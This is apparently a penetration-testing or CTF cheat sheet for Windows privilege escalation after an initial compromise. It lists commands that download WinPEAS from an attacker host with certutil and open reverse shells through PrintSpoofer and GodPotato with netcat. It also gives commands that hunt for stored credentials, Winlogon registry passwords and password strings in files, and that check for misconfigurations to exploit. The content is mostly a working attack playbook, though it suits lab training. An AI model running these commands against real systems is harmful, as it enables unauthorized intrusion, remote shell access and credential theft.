🔐 Phase 4: Post-Exploitation / PrivEsc

Get user flag
type C:\Users\USER\Desktop\user.txt
Check current privileges
whoami /priv
whoami /groups
SeImpersonate? SeBackup? SeRestore?
Run WinPEAS
certutil -urlcache -f http://ATTACKER/winPEASx64.exe winpeas.exe
.\winpeas.exe
If SeImpersonate → Potato attack
.\PrintSpoofer.exe -c "nc.exe ATTACKER PORT -e cmd"
.\GodPotato.exe -cmd "nc.exe ATTACKER PORT -e cmd"
Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Check for stored credentials
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Search for passwords in files
findstr /si password *.txt *.ini *.config *.xml
Check scheduled tasks
schtasks /query /fo LIST /v
